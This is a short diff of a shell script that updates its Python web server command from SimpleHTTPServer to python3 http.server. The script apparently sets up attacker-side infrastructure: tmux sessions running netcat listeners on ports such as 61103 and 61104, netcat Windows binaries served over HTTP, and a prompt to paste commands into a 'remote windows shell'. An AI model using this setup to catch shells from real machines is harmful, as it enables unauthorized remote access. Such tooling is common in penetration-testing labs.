@@ -15,7 +15,7 @@ tmux new-session -d -s win3 'nc -lvnp 61103'
 tmux new-session -d -s win4 'nc -lvnp 61104'
 cd nc_windows_binaries
 echo Hosting nc binaries through python server on 8000...
-tmux new-session -d -s pythonserver 'python -mSimpleHTTPServer 8000'
+tmux new-session -d -s pythonserver 'python3 -m http.server 8000'
 echo
 echo
 echo -e ${GREEN}Paste the following in your remote windows shell...${NOCOLOR}
